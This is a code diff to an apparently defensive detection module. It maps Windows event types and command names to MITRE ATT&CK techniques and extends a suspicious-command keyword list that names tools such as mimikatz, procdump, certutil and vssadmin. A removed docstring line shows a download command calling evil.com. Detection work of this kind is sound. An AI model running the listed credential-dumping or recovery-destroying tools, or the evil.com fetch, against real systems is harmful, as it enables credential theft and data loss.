@@ -39,6 +39,21 @@ MITRE_MAP: dict[str, tuple[str | None, str | None]] = {
     # ── sysmon_linux ──────────────────────────────────────────────────────────
     'Network Connection': ('T1071',     'Application Layer Protocol'),
     'File Deleted':       ('T1070.004', 'Indicator Removal: File Deletion'),
+    # ── Windows EVTX ──────────────────────────────────────────────────────────
+    'Windows Logon Success':           ('T1078',     'Valid Accounts'),
+    'Windows Remote Logon':            ('T1021',     'Remote Services'),
+    'Windows Logon Failure':           ('T1110.001', 'Brute Force: Password Guessing'),
+    'Windows Explicit Credential Use': ('T1550.002', 'Use Alternate Authentication Material: Pass the Hash'),
+    'Windows Privilege Assigned':      ('T1078.002', 'Valid Accounts: Domain Accounts'),
+    'Windows Process Creation':        (None, None),   # resolved per-command via map_command()
+    'Windows Service Installed':       ('T1543.003', 'Create or Modify System Process: Windows Service'),
+    'Windows Scheduled Task':          ('T1053.005', 'Scheduled Task/Job: Scheduled Task'),
+    'Windows Account Created':         ('T1136.001', 'Create Account: Local Account'),
+    'Windows Group Member Added':      ('T1098',     'Account Manipulation'),
+    'Windows Kerberos TGT Request':    ('T1558',     'Steal or Forge Kerberos Tickets'),
+    'Windows Kerberos Service Ticket': ('T1558.003', 'Kerberoasting'),
+    'Windows Kerberos PreAuth Failure':('T1110',     'Brute Force'),
+    'Windows Share Access':            ('T1021.002', 'Remote Services: SMB/Windows Admin Shares'),
     # ── catch-all ─────────────────────────────────────────────────────────────
     'Other':              (None, None),
 }
@@ -100,6 +115,33 @@ SUSPICIOUS_COMMANDS: dict[str, tuple[str, str]] = {
     'john':      ('T1110.002', 'Brute Force: Password Cracking'),
     'hashcat':   ('T1110.002', 'Brute Force: Password Cracking'),
     'hydra':     ('T1110.001', 'Brute Force: Password Guessing'),
+    # ── Windows execution ─────────────────────────────────────────────────────
+    'powershell':('T1059.001', 'Command and Script Interpreter: PowerShell'),
+    'pwsh':      ('T1059.001', 'Command and Script Interpreter: PowerShell'),
+    'cmd':       ('T1059.003', 'Command and Script Interpreter: Windows Command Shell'),
+    'wscript':   ('T1059.005', 'Command and Script Interpreter: Visual Basic'),
+    'cscript':   ('T1059.005', 'Command and Script Interpreter: Visual Basic'),
+    'mshta':     ('T1218.005', 'System Binary Proxy Execution: Mshta'),
+    'rundll32':  ('T1218.011', 'System Binary Proxy Execution: Rundll32'),
+    'regsvr32':  ('T1218.010', 'System Binary Proxy Execution: Regsvr32'),
+    'certutil':  ('T1140',     'Deobfuscate/Decode Files or Information'),
+    'bitsadmin': ('T1197',     'BITS Jobs'),
+    'wmic':      ('T1047',     'Windows Management Instrumentation'),
+    # ── Windows persistence ───────────────────────────────────────────────────
+    'schtasks':  ('T1053.005', 'Scheduled Task/Job: Scheduled Task'),
+    'sc':        ('T1543.003', 'Create or Modify System Process: Windows Service'),
+    'reg':       ('T1112',     'Modify Registry'),
+    'regedit':   ('T1112',     'Modify Registry'),
+    'net':       ('T1069',     'Permission Groups Discovery'),
+    'net1':      ('T1069',     'Permission Groups Discovery'),
+    # ── Windows credential access ─────────────────────────────────────────────
+    'mimikatz':  ('T1003',     'OS Credential Dumping'),
+    'procdump':  ('T1003.001', 'OS Credential Dumping: LSASS Memory'),
+    'ntdsutil':  ('T1003.003', 'OS Credential Dumping: NTDS'),
+    # ── Windows defense evasion / impact ──────────────────────────────────────
+    'vssadmin':  ('T1490',     'Inhibit System Recovery'),
+    'bcdedit':   ('T1490',     'Inhibit System Recovery'),
+    'fsutil':    ('T1070',     'Indicator Removal'),
 }
 
 
@@ -112,10 +154,14 @@ def map_command(command: str) -> tuple[str | None, str | None]:
     """Return (mitre_id, technique_name) for a command string, else (None, None).
 
     Matches on the base command name, ignoring path prefixes and arguments.
-    E.g. '/usr/bin/wget http://evil.com' → ('T1105', 'Ingress Tool Transfer').
+    Handles both Unix (/usr/bin/wget) and Windows (C:\\Windows\\System32\\cmd.exe) paths.
     """
     if not command or not command.strip():
         return (None, None)
     base = command.strip().split()[0]
-    base = base.split('/')[-1].lower()  # strip path prefix like /usr/bin/
+    base = base.replace('\\', '/').split('/')[-1].lower()
+    for ext in ('.exe', '.com', '.bat', '.cmd', '.scr'):
+        if base.endswith(ext):
+            base = base[: -len(ext)]
+            break
     return SUSPICIOUS_COMMANDS.get(base, (None, None))
